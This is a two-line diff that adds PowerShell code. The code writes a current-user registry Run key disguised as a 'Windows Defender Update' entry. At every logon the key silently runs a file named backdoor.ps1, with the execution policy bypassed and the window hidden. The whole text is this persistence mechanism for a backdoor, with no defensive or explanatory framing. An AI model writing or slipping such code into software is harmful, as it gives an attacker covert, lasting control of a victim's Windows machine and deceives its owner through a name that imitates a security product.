@@ -1,0 +1,2 @@
+$path = "C:\Users\Public\backdoor.ps1"
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Windows Defender Update" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File $path"
